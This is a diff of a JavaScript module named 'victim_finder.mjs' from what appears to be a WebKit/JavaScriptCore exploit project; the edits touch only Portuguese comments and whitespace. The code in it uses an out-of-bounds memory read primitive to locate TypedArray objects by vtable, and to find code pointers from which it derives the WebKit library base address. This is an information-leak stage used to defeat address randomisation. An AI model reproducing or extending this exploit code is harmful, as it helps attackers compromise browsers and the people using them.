@@ -1,5 +1,5 @@
 // js/victim_finder.mjs
-import { AdvancedInt64, isAdvancedInt64Object } from './int64.mjs'; // Importa a classe E a função de verificação
+import { AdvancedInt64, isAdvancedInt64Object } from './int64.mjs';
 import { log as appLog, PAUSE_LAB, toHexS1 } from './utils.mjs';
 import * as Core from './core_exploit.mjs';
 import { JSC_OFFSETS, OOB_CONFIG, WEBKIT_LIBRARY_INFO, updateOOBConfigFromUI } from './config.mjs';
@@ -48,7 +48,7 @@ async function scanForTypedArrays(currentCandidateBaseRelOffset, logFn) {
     try {
         const vtableReadOffset = currentCandidateBaseRelOffset + (JSC_OFFSETS.TypedArray.VTABLE_OFFSET || 0);
         vtable_ptr = Core.oob_read_relative(vtableReadOffset, 8);
-        // O log de depuração para vtable_ptr já está em Core.oob_read_relative
+        // O log DEBUG_CORE_READ8 em Core.oob_read_relative já dá detalhes sobre o objeto criado
 
         let vtableMatch = false;
         if (leakedWebKitBaseAddress && KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES.length > 0 && isAdvancedInt64Object(vtable_ptr)) {
@@ -68,7 +68,6 @@ async function scanForTypedArrays(currentCandidateBaseRelOffset, logFn) {
 
         const vectorReadOffset = currentCandidateBaseRelOffset + JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET;
         m_vector_ptr = Core.oob_read_relative(vectorReadOffset, 8);
-        // O log de depuração para m_vector_ptr já está em Core.oob_read_relative
 
         const typeName = TYPED_ARRAY_MODES[m_mode_val] || null;
         const isLengthPlausible = typeof m_length_val === 'number' && m_length_val > 0 && m_length_val < (1024 * 1024 * 32);
@@ -81,7 +80,6 @@ async function scanForTypedArrays(currentCandidateBaseRelOffset, logFn) {
         if (typeName && isLengthPlausible && isVectorPlausible) {
             const bufferPtrReadOffset = currentCandidateBaseRelOffset + JSC_OFFSETS.TypedArray.ASSOCIATED_ARRAYBUFFER_OFFSET;
             m_buffer_ptr = Core.oob_read_relative(bufferPtrReadOffset, 8);
-            // O log de depuração para m_buffer_ptr já está em Core.oob_read_relative
 
             const isBufferPtrPlausible = isAdvancedInt64Object(m_buffer_ptr) &&
                                          !m_buffer_ptr.isNullPtr() &&
@@ -113,7 +111,6 @@ async function scanForCodePointers(currentCandidateBaseRelOffset, logFn) {
     let potentialPtr;
     try {
         potentialPtr = Core.oob_read_relative(currentCandidateBaseRelOffset, 8);
-        // O log de depuração para potentialPtr já está em Core.oob_read_relative
 
         if (isAdvancedInt64Object(potentialPtr) && !potentialPtr.isNullPtr() && !potentialPtr.isNegativeOne()) {
             if (leakedWebKitBaseAddress) {
@@ -123,7 +120,7 @@ async function scanForCodePointers(currentCandidateBaseRelOffset, logFn) {
                     if (potentialPtr.greaterThanOrEqual(segStart) && potentialPtr.lessThan(segEnd)) {
                         for (const [funcName, funcOffsetHex] of Object.entries(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS)) {
                             const funcAbsoluteAddr = leakedWebKitBaseAddress.add(AdvancedInt64.fromHex(funcOffsetHex));
-                            if (potentialPtr.equals(funcAbsoluteAddr)) {
+                            if (potentialPtr.equals(funcAbsoluteAddr)) { 
                                 return {
                                     type: "CodePointer (Exact Match)", gapOrRelativeOffset: currentCandidateBaseRelOffset,
                                     leakedPtrHex: potentialPtr.toString(true), knownFunction: funcName,
@@ -138,10 +135,10 @@ async function scanForCodePointers(currentCandidateBaseRelOffset, logFn) {
                         };
                     }
                 }
-            } else {
+            } else { 
                 for (const [funcName, funcOffsetHex] of Object.entries(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS)) {
                     const funcOffsetInt64 = AdvancedInt64.fromHex(funcOffsetHex);
-                    const potentialBaseAddr = potentialPtr.sub(funcOffsetInt64);
+                    const potentialBaseAddr = potentialPtr.sub(funcOffsetInt64); 
                     if ((potentialBaseAddr.low() & 0xFFF) === 0 && potentialBaseAddr.greaterThanOrEqual(new AdvancedInt64(0x10000000,0))) {
                         return {
                             type: "CodePointer (Base Calculated)", gapOrRelativeOffset: currentCandidateBaseRelOffset,
